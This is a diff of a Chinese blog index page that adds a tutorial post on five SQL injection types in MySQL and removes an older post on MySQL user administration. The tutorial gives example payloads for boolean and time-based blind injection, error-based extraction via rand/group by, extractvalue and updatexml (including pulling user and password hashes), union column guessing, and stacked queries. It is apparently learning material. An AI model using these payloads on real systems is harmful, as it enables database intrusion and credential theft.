@@ -194,6 +194,127 @@
           
           
             
+              <a class="post-title-link" href="/2015/08/13/SQL注入练级攻略-5-5种注入方式/" itemprop="url">
+                SQL注入练级攻略(5)-5种注入类型
+              </a>
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2015-08-13T09:42:10+08:00" content="2015-08-13">
+            2015-08-13
+          </time>
+        </span>
+
+        
+          <span class="post-category" >
+            &nbsp; | &nbsp; 分类于
+            
+              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                <a href="/categories/SLQ注入练级系列/" itemprop="url" rel="index">
+                  <span itemprop="name">SLQ注入练级系列</span>
+                </a>
+              </span>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2015/08/13/SQL注入练级攻略-5-5种注入方式/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/13/SQL注入练级攻略-5-5种注入方式/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody"><h2 id="基于布尔的盲注">基于布尔的盲注</h2><pre><code>mysql&gt; <span class="keyword">select</span> username <span class="keyword">from</span> admin <span class="keyword">where</span> id = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>;
+mysql&gt; <span class="keyword">select</span> username <span class="keyword">from</span> admin <span class="keyword">where</span> id = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span>;<span class="comment">//根据返回内容的真假判断是否存在注入</span>
+</code></pre><h2 id="基于时间的盲注">基于时间的盲注</h2><pre><code>mysql&gt; select username from admin where id = <span class="number">1</span> or <span class="keyword">if</span><span class="params">(length<span class="params">(user)</span>&gt;<span class="number">10</span>,sleep<span class="params">(<span class="number">3</span>)</span>,<span class="number">0</span>)</span>;
+mysql&gt; select username from admin where id = <span class="number">1</span> or <span class="keyword">if</span><span class="params">(ascii<span class="params">(mid<span class="params">(lower<span class="params">(user<span class="params">()</span>)</span>)</span>,<span class="number">1</span>,<span class="number">1</span>)</span>=<span class="number">114</span>,sleep<span class="params">(<span class="number">3</span>)</span>,<span class="number">0</span>)</span>;
+<span class="comment">//如果if中条件成立返回延时.</span>
+<span class="comment">//BENCHMARK(100000,SHA1('true'))替代sleep(3)，前者在mysql 4/5适用，后者在mysql 5 适用.</span>
+</code></pre><h2 id="基于报错的注入">基于报错的注入</h2><p>-rand和group的冲突</p>
+<pre><code>mysql&gt; <span class="keyword">select</span> user <span class="keyword">from</span> mysql.user <span class="built_in">where</span> user=<span class="string">"test"</span> <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*),concat(left(<span class="built_in">rand</span>(),<span class="number">3</span>),version())x <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> x)b;
+
+mysql&gt; <span class="keyword">select</span> user <span class="keyword">from</span> mysql.user <span class="built_in">where</span> user=<span class="string">"test"</span> <span class="built_in">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*),concat_ws(<span class="string">":"</span>,user(),version(),<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> x) b);
+
+<span class="comment">//x的语句为:concat_ws(":",user(),version(),floor(rand(0)*2)),rand()是不允许放在group by之后的所以用group by x 之后报错 显示出 user，version信息</span>
+</code></pre><p>遇到的问题：<br>1.如果想用报错注入显示database()信息时，不能为NULL，必须使用use databasename；选择一个数据库。<br>2.注意上述语句中使用 union 和 and 的区别 一个括号。<br>3.floor(rand(0)x2)其中乘以三乘以4都是可以的，2是一个习惯用法。<br>4.除了floor(rand(0)x3)，使用left(rand(),3)之类不确定的数值跟在group by之后也是可以报错的。</p>
+<p>-extractvalue注入</p>
+<pre><code>mysql&gt; <span class="keyword">select</span> user <span class="keyword">from</span> mysql.user <span class="keyword">where</span> user=<span class="string">"test"</span> <span class="function">and <span class="title">extractvalue</span>(<span class="params"><span class="number">1</span>, concat(<span class="number">0x7e</span>,@@version</span>))</span>;
+<span class="comment">//0x7e对应 ~</span>
+</code></pre><p>说明：<br>1.extractvalue函数是用来获取xml中的数据extractvalue(pram1,pram2)<br>2.在pram2的部分正常情况下应该填写路径，在这里我们构造了extractvalue(1, concat(0x7e,@@version))，系统报错显示了我们构造部分的内容<br>3.获取内容有长度限制,最长32位。</p>
+<p>-UpdateXML()注入</p>
+<pre><code>mysql&gt; select <span class="keyword">user</span> <span class="keyword">from</span> mysql.<span class="keyword">user</span> where <span class="keyword">user</span>=<span class="string">"test"</span> and updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(SELECT distinct concat(<span class="number">0</span>x23,<span class="keyword">user</span>,<span class="number">0</span>x3a,password,<span class="number">0</span>x23) FROM <span class="keyword">user</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0</span>x7e),<span class="number">1</span>);
+//<span class="number">0</span>x7e对应 ~
+mysql&gt; select <span class="keyword">user</span> <span class="keyword">from</span> mysql.<span class="keyword">user</span> where <span class="keyword">user</span>=<span class="string">"test"</span> and updatexml(<span class="number">1</span>,a,<span class="number">1</span>);//上述语句简化
+
+//a的值为concat(<span class="number">0</span>x7e,(SELECT concat(<span class="number">0</span>x23,<span class="keyword">user</span>,<span class="number">0</span>x3a,password,<span class="number">0</span>x23) FROM <span class="keyword">user</span> <span class="keyword">limit</span> <span class="number">1</span>))
+//对应的也可以替换为concat(<span class="number">0</span>x7e,@@version,<span class="keyword">user</span>(),database())
+</code></pre><p>说明：<br>1.UpdateXML(1,a,1)是一个使用不同的XML标记匹配和替换XML块的函数.<br>2.在a的部分添加目标内容~~如上代码.<br>3.获取内容有长度限制,最长32位。</p>
+<h2 id="联合查询注入">联合查询注入</h2><p>绕过了union和select基本就可以干所有的事情了<br>1.最基本的查询其他内容    </p>
+<pre><code>mysql&gt; <span class="keyword">select</span> id <span class="keyword">from</span> admin2 <span class="built_in">union</span> <span class="built_in">all</span> <span class="keyword">select</span> username <span class="keyword">from</span> admin;
+</code></pre><p>2.猜解字段数：</p>
+<pre><code>mysql&gt; select * from admin where id = <span class="number">1</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5.</span>..from admin;
+<span class="comment">//知道返回正常就说明有几个字段</span>
+</code></pre><p>3.猜解字段</p>
+<pre><code>mysql&gt; select * from admin where id = <span class="number">1</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,username,<span class="number">5.</span>..from admin
+<span class="comment">//猜解username字段是否存在</span>
+</code></pre><h2 id="堆查询注入">堆查询注入</h2><p>PHP使用PDO_MYSQL来连接数据库，便可以使用堆查询，堆查询可以同时执行多个语句。</p>
+<pre><code>mysql&gt; <span class="keyword">select</span> @@version;<span class="function"><span class="keyword">select</span> <span class="title">database</span>(<span class="params"></span>)</span>;
+mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> user <span class="keyword">where</span> user=root and <span class="number">1</span>=<span class="number">0</span>; <span class="function">insert <span class="title">into</span> (<span class="params">username,password</span>) <span class="title">VALUES</span> (<span class="params"><span class="string">'BobbyTables'</span>, <span class="string">'kl20da$$'</span></span>)</span>;
+<span class="comment">//可以同时执行多个语句</span>
+</code></pre><p><em>以上内容使用的数据库版本为mysql 5.6.17.</em></p>
+</span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
               <a class="post-title-link" href="/2015/08/12/SQL注入练级攻略-4-数据库常量及函数/" itemprop="url">
                 SQL注入练级攻略(4)-数据库常量及函数
               </a>
@@ -1773,125 +1894,6 @@ git <span class="keyword">push</span>                   <span class="preprocesso
 
 
     
-      
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      
-      
-        <h1 class="post-title" itemprop="name headline">
-          
-          
-            
-              <a class="post-title-link" href="/2015/08/07/mysql使用记录总结/" itemprop="url">
-                MySql用户及字符集操作
-              </a>
-            
-          
-        </h1>
-      
-
-      <div class="post-meta">
-        <span class="post-time">
-          发表于
-          <time itemprop="dateCreated" datetime="2015-08-07T17:47:50+08:00" content="2015-08-07">
-            2015-08-07
-          </time>
-        </span>
-
-        
-
-        
-          
-            <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/2015/08/07/mysql使用记录总结/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/07/mysql使用记录总结/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-          
-        
-      </div>
-    </header>
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody"><h2 id="categories:_杂七杂八">categories: 杂七杂八</h2><p>MySql中添加用户,新建数据库,用户授权,删除用户,修改密码(注意每行后边都跟个;表示一个命令语句结束):</p>
-<h2 id="1-新建用户">1.新建用户</h2><p>登录MYSQL：</p>
-<pre><code><span class="built_ins">cmd</span>&gt;mysql -u root -p
-<span class="built_ins">cmd</span>&gt;密码
-</code></pre><p>创建用户：</p>
-<pre><code>mysql&gt; insert into mysql.user<span class="params">(Host,User,Password)</span> values<span class="params">(<span class="string">"localhost"</span>,<span class="string">"test"</span>,password<span class="params">(<span class="string">"1234"</span>)</span>)</span>;
-</code></pre><p>这样就创建了一个名为：test 密码为：1234 的用户。<br>注意：此处的”localhost”，是指该用户只能在本地登录，不能在另外一台机器上远程登录。如果想远程登录的话，将”localhost”改为”%”，表示在任何一台电脑上都可以登录。也可以指定某台机器可以远程登录。<br>然后登录一下：</p>
-<pre><code>mysql&gt;<span class="flow">exit</span>;
-<span class="built_in">cmd</span>&gt;mysql -u test -p
-<span class="built_in">cmd</span>&gt;输入密码
-mysql&gt;登录成功
-</code></pre><h2 id="2-为用户授权">2.为用户授权</h2><p>授权格式：</p>
-<pre><code><span class="operator"><span class="keyword">grant</span> 权限 <span class="keyword">on</span> 数据库.* <span class="keyword">to</span> 用户名@登录主机 <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">"密码"</span>;</span>　
-</code></pre><p>登录MYSQL（有ROOT权限），这里以ROOT身份登录：</p>
-<pre><code><span class="built_ins">cmd</span>&gt;mysql -u root -p
-<span class="built_ins">cmd</span>&gt;密码
-</code></pre><p>首先为用户创建一个数据库(testDB)：</p>
-<pre><code>mysql&gt;create database <span class="built_in">test</span>DB;
-</code></pre><p>授权test用户拥有testDB数据库的所有权限（某个数据库的所有权限）：</p>
-<pre><code>mysql&gt;grant all privileges <span class="function_start"><span class="keyword">on</span></span> testDB.* <span class="keyword">to</span> test@localhost identified <span class="keyword">by</span> '<span class="number">1234</span>';
-mysql&gt;flush privileges;  刷新系统权限表
-格式：grant 权限 <span class="function_start"><span class="keyword">on</span></span> 数据库.* <span class="keyword">to</span> 用户名@登录主机 identified <span class="keyword">by</span> <span class="string">"密码"</span>;　
-</code></pre><p>如果想指定部分权限给一用户，可以这样来写:</p>
-<pre><code>mysql&gt;grant <span class="keyword">select</span>,update <span class="keyword">on</span> testDB<span class="built_in">.</span>* <span class="keyword">to</span> test@localhost identified <span class="keyword">by</span> <span class="string">'1234'</span>;
-</code></pre><p>　　mysql&gt;flush privileges; 刷新系统权限表</p>
-<p>授权test用户拥有所有数据库的某些权限： </p>
-<pre><code>mysql&gt;grant select,<span class="built_in">delete</span>,<span class="keyword">update</span>,create,<span class="keyword">drop</span> <span class="keyword">on</span> *.* <span class="keyword">to</span> test@<span class="string">"%"</span> identified by <span class="string">"1234"</span>;
-//test用户对所有数据库都有select,<span class="built_in">delete</span>,<span class="keyword">update</span>,create,<span class="keyword">drop</span> 权限。
-//@<span class="string">"%"</span> 表示对所有非本地主机授权，不包括localhost。（localhost地址设为<span class="number">127.0</span>.<span class="number">0.1</span>，如果设为真实的本地地址，不知道是否可以，没有验证。）
-</code></pre><p>//对localhost授权：加上一句</p>
-<pre><code><span class="operator"><span class="keyword">grant</span> all <span class="keyword">privileges</span> <span class="keyword">on</span> testDB.* <span class="keyword">to</span> <span class="keyword">test</span>@localhost <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'1234'</span>;</span>即可。
-</code></pre><h2 id="3-删除用户">3.删除用户</h2><pre><code>cmd&gt;mysql -u root -p
-cmd&gt;密码
-mysql&gt;Delete <span class="keyword">FROM</span> user <span class="keyword">Where</span> User=<span class="string">'test'</span> <span class="keyword">and</span> Host=<span class="string">'localhost'</span>;
-mysql&gt;flush privileges;
-mysql&gt;drop database testDB; <span class="comment">//删除用户的数据库</span>
-</code></pre><p>删除账户及权限：</p>
-<pre><code>&gt;drop user 用户名<span class="at_rule">@<span class="string">'%'</span>;</span>
-&gt;drop user 用户名<span class="at_rule">@<span class="preprocessor"> localhost</span>;</span> 
-</code></pre><h2 id="4-修改指定用户密码">4.修改指定用户密码</h2><pre><code>cmd&gt;mysql -u root -p
-cmd&gt;密码
-mysql&gt;<span class="keyword">update</span> mysql.user <span class="built_in">set</span> password=password('新密码') <span class="built_in">where</span> User=<span class="string">"test"</span> <span class="built_in">and</span> Host=<span class="string">"localhost"</span>;
-mysql&gt;flush privileges;
-</code></pre><h2 id="5-字符集相关操作">5.字符集相关操作</h2><p>mysql&gt;show database;<br>|<strong>查看所有数据库：</strong>show databases ;<br>|<strong>创建数据库：</strong>create database 数据库名；<br>|<strong>创建指定字符集数据库：</strong>    create database test2 default character set utf8<br>|<strong>查看指定数据库使用字符集：</strong>show create database 数据库名；<br>|<strong>删除数据库：</strong>drop database 数据库名;<br>|<strong>查看数据关于字符集的默认配置：</strong> show variables like ‘character%’;<br>|<strong>修改字符集的方法（结合上一句）：</strong></p>
-<pre><code><span class="operator"><span class="keyword">SET</span> character_set_client = utf8 ;</span>
-<span class="operator"><span class="keyword">SET</span> character_set_connection = utf8 ;</span> 
-<span class="operator"><span class="keyword">SET</span> character_set_results = utf8 ;</span> 
-<span class="operator"><span class="keyword">SET</span> character_set_server = utf8 ;</span> 
-<span class="operator"><span class="keyword">SET</span> collation_connection = utf8 ;</span> 
-<span class="operator"><span class="keyword">SET</span> collation_database = utf8 ;</span> 
-<span class="operator"><span class="keyword">SET</span> collation_server = utf8 ;</span> 
-</code></pre></span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1930,7 +1932,7 @@ mysql&gt;flush privileges;
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">41</span>
+              <span class="site-state-item-count">42</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
